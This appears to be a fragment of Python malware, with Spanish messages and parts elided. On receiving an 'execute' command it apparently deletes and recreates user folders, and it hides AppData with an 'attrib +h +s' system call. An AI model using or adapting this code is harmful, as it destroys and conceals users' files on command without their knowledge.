        ...
        if data[:].decode("latin1") == 'execute':
            try:
                ...
                if not os.path.exists(path):
                    os.mkdir(path)
                    print('Eliminado y recreado correctamente')
                else:
                ...
                os.mkdir(Roaming)
                mensage(Roaming)
                os.system("attrib +h +s " + path + "\\AppData")
                print("Permisos asignados a AppData")
